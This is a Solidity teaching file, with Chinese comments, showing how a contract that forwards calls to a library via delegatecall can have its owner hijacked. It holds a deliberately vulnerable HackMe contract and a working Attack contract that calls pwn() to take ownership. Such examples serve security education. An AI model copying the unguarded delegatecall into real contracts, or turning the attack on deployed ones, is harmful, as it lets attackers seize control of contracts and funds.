// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
HackMe是一个使用delegatecall执行代码的合约。由于HackMe内部没有更改所有者的功能，因此更改所有者并不明显。但攻击者可以通过利用delegatecall来劫持合约。让我们看看如何实现。

1. Alice部署了Lib。
2. Alice使用Lib的地址部署了HackMe。
3. Eve使用HackMe的地址部署了Attack。
4. Eve调用Attack.attack()。
5. 现在Attack是HackMe的所有者。

发生了什么？

Eve调用了Attack.attack()。
Attack调用了HackMe的fallback函数，并发送了pwn()函数的函数选择器。
HackMe使用delegatecall将调用转发到Lib。
在这里，msg.data包含pwn()函数的函数选择器。
这告诉Solidity在Lib内部调用函数pwn()。
函数pwn()将所有者更新为msg.sender。
Delegatecall使用HackMe的上下文运行Lib的代码。
因此，HackMe的存储被更新为msg.sender，其中msg.sender是HackMe的调用者，即Attack。
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
